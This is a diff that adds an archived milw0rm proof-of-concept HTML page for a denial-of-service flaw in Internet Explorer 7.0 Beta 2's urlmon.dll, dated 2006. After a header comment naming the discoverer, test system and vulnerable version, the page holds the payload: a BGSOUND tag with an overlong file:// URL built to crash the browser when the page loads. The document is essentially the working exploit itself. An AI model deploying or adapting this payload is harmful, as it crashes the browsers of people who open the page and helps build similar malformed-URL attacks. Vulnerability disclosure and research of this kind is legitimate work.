@@ -1,0 +1,30 @@
+<html>
+<head>
+<title>MS Internet Explorer 7.0 Beta 2 (urlmon.dll) Denial of Service Vuln</title>
+<pre>
+&lt;!--- 
+    Internet Explorer 7.0 Beta 2 urlmon.dll DoS 
+    
+    Discovered by:
+    Tom Ferris
+    &lt;tommy[at]security-protocols[dot]com&gt;
+    
+    Tested on:
+    Windows XP SP2
+    
+    Vulnerable Versions:
+    IE 7.0.5296.0
+    
+    1/31/2006 Security-Protocols.com
+    
+    This program is free software; you can redistribute it and/or modify it under 
+    the terms of the GNU General Public License version 2, 1991 as published by
+    the Free Software Foundation.
+!--&gt;
+
+&lt;BGSOUND SRC=file://------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- &gt;
+
+# milw0rm.com [2006-02-07]
+</pre>
+</html>
+
